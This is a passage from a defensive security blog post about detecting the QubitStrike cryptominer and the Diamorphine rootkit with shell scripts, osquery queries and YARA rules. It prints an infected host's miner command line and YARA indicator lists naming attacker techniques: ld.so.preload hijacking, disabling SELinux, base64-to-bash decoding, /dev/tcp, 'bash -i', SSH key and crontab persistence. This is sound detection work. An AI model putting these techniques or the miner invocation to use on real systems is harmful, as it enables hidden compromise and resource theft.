    exe=$(readlink "/proc/$i/exe")
    cmdline=$(tr '\000' ' ' <"/proc/$i/cmdline")
    echo "- hidden $(cat /proc/$i/comm)[${i}] is running ${exe}: ${cmdline}"
done
```

Here's what this script outputs on a QubitStrike victim host:

```log
- hidden python-dev[27158] is running /usr/share/.LQvKibDTq4/python-dev: /usr/share/.LQvKibDTq4/python-dev -B -o pool.hashvault.pro:80 -u 49qQh9VMzdJTP1XA2yPDSx1QbYkDFupydE5AJAA3jQKTh3xUYVyutg28k2PtZGx8z3P2SS7VWKMQUb9Q4WjZ3jdmHPjoJRo -p 136.54.68.146 --donate-level 1 --tls --tls-fingerprint=420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --max-cpu-usage 90 
```

If a rootkit uses a kernel module, as Diamorphine does, it's almost certainly going to impact the [kernel taint](https://www.kernel.org/doc/html/v4.19/admin-guide/tainted-kernels.html) value, as well as leave evidence behind in the `dmesg` buffer. QubitStrike and Diamorphine are no exception:

```
kernel taint value: 12288
* matches bit 12: externally-built (out-of-tree) module was loaded
* matches bit 13: unsigned module was loaded

dmesg:
[ 1721.518533] diamorphine: loading out-of-tree module taints kernel.
[ 1721.536521] diamorphine: module verification failed: signature and/or required key missing - tainting kernel
```

Now for the new star of the show, the script that uncovers kernel rootkits that communicate via signal:

```diff
-- [ rootkit-signal-handler.sh ] -----------------------------------------------
NOTE: root-escalation detection requires a non-root user
- SIGNAL 31 made /proc/46233 (this process) invisible!
- SIGNAL 63 caused /proc/modules to change:
--- /tmp/tmp.sjwv6iMtDx 2023-10-20 02:34:25.912665169 +0000
+++ /tmp/tmp.L1e9HVPFGi 2023-10-20 02:34:25.964663794 +0000
@@ -10,6 +10,7 @@
 bridge
 btrfs
 ccp
+diamorphine
 dm_multipath
 drm
 drm_kms_helper
- SIGNAL 31 made /proc/46233 (this process) visible again!
- SIGNAL 63 caused /proc/modules to change:
--- /tmp/tmp.IoOFxxR8en 2023-10-20 02:34:34.156522332 +0000
+++ /tmp/tmp.AWQeOosqOh 2023-10-20 02:34:34.212521840 +0000
@@ -10,7 +10,6 @@
 bridge
 btrfs
 ccp
-diamorphine
 dm_multipath
 drm
 drm_kms_helper
```

It's also easy to detect the SSH keys, hidden directories, and crontab entries - if you want to see how, check out the [tstromberg/sunlight](https://github.com/tstromberg/sunlight) repo.

## Detecting Qubitstrike with osquery

Some of you might know that I also maintain the [osquery-defense-kit](https://github.com/chainguard-dev/osquery-defense-kit) project, something I've put together in my time at [Chainguard](https://chainguard.dev/). It's a collection of production-quality queries to uncover suspicious behavior using [osquery](https://www.osquery.io/).

![](ttv2DxWz.png)

`osquery-defense-toolkit` has a handy `make detect` target to run all the scripts. Here's what pops up on a machine with Qubitstrike:

```
pid-hidden-by-rootkit (1 rows)
------------------------------
cgroup_path:/user.slice/user-501.slice/session-4.scope cmdline:'/usr/share/.LQvKibDTq4/python-dev -B -o pool.hashvault.pro:80 -u 49qQh9VMzdJTP1XA2yPDSx1QbYkDFupydE5AJAA3jQKTh3xUYVyutg28k2PtZGx8z3P2SS7VWKMQUb9Q4WjZ3jdmHPjoJRo -p 136.54.68.146 --donate-level 1 --tls --tls-fingerprint=420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --max-cpu-usage 90' cwd:/ disk_bytes_read:311296 disk_bytes_written:0 egid:0 euid:0 gid:0 name:python-dev nice:0 on_disk:1 parent:1 path:/usr/share/.LQvKibDTq4/python-dev pgroup:4030 pid:4030 resident_size:4096000 root:/ sgid:0 start_time:1697625949 state:S suid:0 system_time:23170 threads:10 total_size:2504282112 uid:0 user_time:6077320 wired_size:0
```

This is effectively a port of the hidden-pids.sh script I showed you before:

```sql

WITH RECURSIVE cnt(x) AS (
   SELECT 1
   UNION ALL
   SELECT x + 1
   FROM cnt
   LIMIT 4194304
)
SELECT p.*
FROM cnt
   JOIN processes p ON x = p.pid
WHERE x NOT IN (
       SELECT pid
       FROM processes
)
AND p.start_time < (strftime('%s', 'now') - 1)
AND (
       p.pgroup = p.pid
       OR (
           p.pid = p.parent
           AND p.threads = 1
       )
)
```

osquery finds the SSH keys:

```
unexpected-ssh-authorized-keys (1 rows)
---------------------------------------
atime:1697625779 ctime:1697625778 gid:0 mtime:1697625778 path:/root/.ssh/authorized_keys sha256:e8d5053e7c719114b45956695da845840ab45fb3e8d659f4ed991b274a8ed7a8 size:563 u_uid:0 uid:0 username:root
```

As well as the kernel taint:

```
unusually-tainted-kernel-linux (1 rows)
---------------------------------------
force_loaded:0 force_unloaded:0 is_aux:0 is_unsigned:8192 kernel_warning:0 modules:nft_compat,nft_chain_nat,overlay,xt_tcpudp,xt_nat,xt_multiport,xt_mark,xt_conntrack,xt_comment,xt_addrtype,xt_MASQUERADE,nf_tables,nfnetlink,ip6table_filter,iptable_filter,ip6table_nat,iptable_nat,nf_nat,nf_conntrack,nf_defrag_ipv6,nf_defrag_ipv4,ip6_tables,veth,bridge,stp,llc,tap,tls,isofs,kvm_amd,ccp,binfmt_misc,kvm,irqbypass,virtio_input,nls_iso8859_1,input_leds,serio_raw,dm_multipath,scsi_dh_rdac,scsi_dh_emc,scsi_dh_alua,efi_pstore,ip_tables,x_tables,autofs4,btrfs,blake2b_generic,raid10,raid456,async_raid6_recov,async_memcpy,async_pq,async_xor,async_tx,xor,raid6_pq,libcrc32c,raid1,raid0,multipath,linear,virtio_gpu,virtio_dma_buf,drm_shmem_helper,drm_kms_helper,syscopyarea,sysfillrect,sysimgblt,psmouse,ahci,virtio_net,drm,libahci,net_failover,virtio_blk,xhci_pci,xhci_pci_renesas,virtio_rng,failover out_of_spec:0 out_of_tree:4096 proprietary:0 requested_by_userspace:0 taint:12288
```

To look at the source code to these queries, see:

* [pid-hidden-by-rootkit.sql](https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/evasion/pid-hidden-by-rootkit.sql)
* [unexpected-ssh-authorized-keys.sql](https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/persistence/unexpected-ssh-authorized-keys.sql)
* [unusually-tainted-kernel-linux.sql](https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/evasion/unusually-tainted-kernel-linux.sql)

These queries were written way before QubitStrike ever existed; they just happen to cover a broad set of malicious behavior. It's nice when old tricks still work on new dogs.

## Detecting Qubitstrike with YARA

![](9grhf7eX.png)

The original article by Cado had a very specific rule for the QubitStrike installer. Still, it's worth mentioning that generic malware detection rules that predate QubitStrike are equally as good at detecting not just the QubitStrike, but also the files it installs: Using a set of general-purpose YARA rules I plan to open-source, the QubitStrike installer triggered a record 22 different rules:

```log
CRITICAL /Users/t/src/malware-menagerie/linux/2023.Trojan_Miner.QubitStrike/installer/mi.sh
  * router_malware
      usr_sbin: /usr/sbin
      wget: /wget
      curl: /curl
  * ld_so_preload
      ld_so_preload: /etc/ld.so.preload
  * systemctl_calls
      systemctl_disable: systemctl disable
  * linux_service_disabler
      setenforce_0: setenforce 0
      selinux_disabled: SELINUX=disabled
      watchdog: kernel.nmi_watchdog=0
  * linux_pkg_installer_command
      yum: yum install -y
  * danger_base64_decoder
      base64_d: base64 -d
  * echo_decode_bash
      echo: echo
      base64_d: base64 -d
      bash: bash
  * hardcoded_var_tmp_location
      var_tmp: /var/tmp/.
  * obfuscated_base64
      b_c_program: I2luY2x1ZGUgPHN0ZGlvLmg+
      b_user_rootkit: jaW5jbHVkZSA8ZGlyZW50Lmg+
      b_gzip: H4sI
  * hide_this_plz
      histfile: HISTFILE=
      histfile_dev: HISTFILE=/dev
  * kill_and_remove
      rm_f: rm -f
      rm_rf: rm -rf
      k_killall: killall
      k_pgrep: pgrep
      k_pkill: pkill
  * rm_f_hardcoded_tmp_path
      rm_f_tmp_var_dev: rm -rf /tmp/.LQvKibDTq4/
  * crontab_writer
      c_etc_crontab: /etc/crontab
      c_root_cron_entry: * * * * root
      c_reboot: @reboot
  * hidden_path
      crit: /tmp/.LQvKibDTq4
  * weird_tmp_path_not_hidden
      tmp_digits: /tmp/65
      tmp_short: /tmp/.$
  * chattr_caller
      chattr: chattr -
  * ssh_key_access
      ssh_authorized_keys: authorized_keys
      ssh_dir: /.ssh
  * recon_commands
      c_whoami: whoami
      c_id: id
      c_hostname: hostname
      c_ifconfig: ifconfig
  * suspicious_fetch_command
      curl_d: curl -o
      curl_insecure: curl --silent --insecure
  * hardcoded_dns_resolver
      d_google_public: 8.8.8.8
  * danger_crypto_miner
      crypto_pool: crypto-pool
      f2pool: f2pool
      monero_hash: monerohash
      monero_pool: moneropool
      xmrpool: xmrpool
      xmrig: xmrig
```

Most of the queries are self-evident, but I'll share one of the cooler queries I use to detect malware that is hiding data away in base64 encoded blobs:

```yara
rule obfuscated_base64 {
    $b_chmod = "chmod" base64
    $b_curl = "curl " base64
    $b_bin_sh = "/bin/sh" base64
    $b_bin_bash = "/bin/bash" base64
    $b_openssl = "openssl" base64
    $b_dev_null = "/dev/null" base64
    $b_user_agent = "User-Agent" base64
    $b_usr_bin = "/usr/bin" base64
    $b_usr_sbin = "/usr/sbin" base64
    $b_var_tmp = "/var/tmp" base64
    $b_var_run = "/var/run" base64
    $b_screen_dm = "screen -dm" base64
    $b_zmodload = "zmodload" base64
    $b_dev_tcp = "/dev/tcp" base64
    $b_bash_i = "bash -i" base64
    $b_bash_c = "bash -c" base64
    $b_http = "http://" base64
    $b_https = "https://" base64
    $b_c_program = "#include <stdio.h>" base64
    $b_user_rootkit = "#include <dirent.h>" base64
    $b_kernel_rootkit = "#include <linux/module.h>" base64
    $b_c_program2 = "#include<stdio.h>" base64
    $b_user_rootkit2 = "#include<dirent.h>" base64
    $b_kernel_rootkit2 = "#include<linux/module.h>" base64
    $b_password = "password" base64
    $b_gzip = "H4sI"
    $not_kandji = "kandji-parameter-agent"
    $not_kolide = "KOLIDE_LAUNCHER_OPTION"
    $not_mdmprofile = "mdmprofile"
    $not_chromium = "RasterCHROMIUM"
    $not_cert = "-----BEGIN CERTIFICATE-----"
  condition:
    filesize < 10485760 and any of ($b_*) and none of ($not_*)
}
```

My rules have not attempted to detect rootkit source code yet, but surprisingly, this exceptionally broad rule worked to discover Diamorphine:

```yara
rule suspicious_keywords {
  strings:
    $DDoS = "DDoS"
    $DD0S = "DD0S"
    $backdoor = "backdoor"
    $Backdoor = "Backdoor"
    $backd00r = "backd00r"
    $rootkit = "rootkit"
    $Rootkit = "Rootkit"
    $r00tkit = "r00tkit"
    $r00tk1t = "r00tk1t"
    $trojan = "trojan"
    $Trojan = "Trojan"
    $tr0jan = "tr0jan"
  condition:
    any of them
}
```

This simple rule to detect usermode rootkits caught the `prochide.c`:

```yara
rule userspace_process_hider {
  strings:
    $prochide = "processhide"
    $proc_to_filter = "process_to_filter"
    $readdir_override = "original_readdir"
  condition:
    any of them
}
```

The `python-dev` xmrig program triggered 8 different rules. I'll share one of the more creative ones:

```yara
rule probably_a_linux_miner {
  strings:
    $argon = "argon2d"
    $proc_self = "/proc/self"
    $numa = "NUMA"
  condition:
    all of them
}
```

If you want to see some YARA queries specifically tuned for finding Linux rootkits, [dmknght/rkcheck](https://github.com/dmknght/rkcheck/blob/main/rules/rootkit.yar) is a good reference.

## Detecting using gut instinct

If you ever see a host with a load of 5.0+ and no high-CPU processes, chances are you have been infected with a hidden crypto-miner. No rootkit I've seen on Linux attempts to manipulate load values.

## Wrapping Up

I hope you had fun through this tour. If you have any questions or malware samples to share, feel free to contact me at thomas(%2b)stromberg.org